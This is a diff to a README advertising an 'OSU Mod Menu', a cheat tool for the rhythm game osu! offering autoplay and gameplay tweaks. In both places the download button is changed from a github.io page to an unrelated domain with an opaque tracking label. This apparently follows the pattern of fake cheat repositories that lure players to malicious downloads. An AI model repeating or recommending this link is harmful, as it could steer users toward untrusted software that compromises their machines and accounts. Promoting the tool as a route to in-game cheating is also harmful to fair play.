@@ -2,7 +2,7 @@
 
 The **OSU Mod Menu** is a powerful and user-friendly tool designed to enhance and personalize your experience in the rhythm game **osu!** Whether you're looking to practice maps, improve performance, or add fun tweaks, this mod menu provides everything you need to elevate your gameplay.
 
-[![Download OSU ModMenu](https://img.shields.io/badge/Download-OSU%20ModMenu-blueviolet)](https://osu-mod-menu.github.io/.github/)
+[![Download OSU ModMenu](https://img.shields.io/badge/Download-OSU%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 From visual customization and autoplay options to advanced tweak settings, the OSU Mod Menu gives you full control over your rhythm journey.
 
@@ -66,4 +66,4 @@ From visual customization and autoplay options to advanced tweak settings, the O
 
 🎵 Master the beat your way with the **OSU Mod Menu** – practice smarter, play smoother, and make the game truly yours!
 
-[![Download OSU ModMenu](https://img.shields.io/badge/Download-OSU%20ModMenu-blueviolet)](https://osu-mod-menu.github.io/.github/)
+[![Download OSU ModMenu](https://img.shields.io/badge/Download-OSU%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
